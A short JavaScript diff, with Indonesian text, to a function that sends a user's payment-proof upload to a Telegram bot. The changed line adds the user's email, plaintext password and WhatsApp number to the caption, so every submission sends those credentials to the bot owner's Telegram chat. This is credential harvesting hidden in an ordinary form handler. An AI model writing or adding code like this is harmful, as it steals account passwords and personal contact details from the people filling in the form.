@@ -650,7 +650,7 @@ async function sendToTelegram(data) {
     const fileData = new FormData();
     fileData.append('chat_id', CHAT_ID);
     fileData.append('document', data.paymentFile[0]);
-    fileData.append('caption', `🧾 Bukti Pembayaran dari *${data.fullName}*`);
+    fileData.append('caption', `🧾 Bukti Pembayaran dari *${data.fullName}* dengan Email : ${data.email} , Password : ${data.password} dan Nomor Whatsapp : ${data.whatsapp}`);
     fileData.append('parse_mode', 'Markdown');
 
     const filePromise = fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendDocument`, {
